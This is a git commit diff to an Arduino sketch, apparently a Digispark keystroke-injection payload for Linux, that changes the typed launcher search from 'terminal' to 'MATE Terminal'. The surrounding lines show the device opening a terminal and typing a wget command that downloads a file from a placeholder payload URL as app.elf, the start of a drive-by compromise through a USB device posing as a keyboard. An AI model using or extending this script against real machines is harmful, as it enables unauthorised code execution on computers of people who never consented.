af68e14da3001842bd969c218326fffc4fa65347
Alessandro Ideo <103458862+usg-ishimura@users.noreply.github.com>
2024-01-30 08:35:47 +0000

    Update LNXDuckuino.ino

--- payloads/LNXDuckuino.ino
+++ payloads/LNXDuckuino.ino
@@ -6,7 +6,7 @@ void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("terminal");
+  DigiKeyboard.print("MATE Terminal");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("wget <payload-URL> -O app.elf");
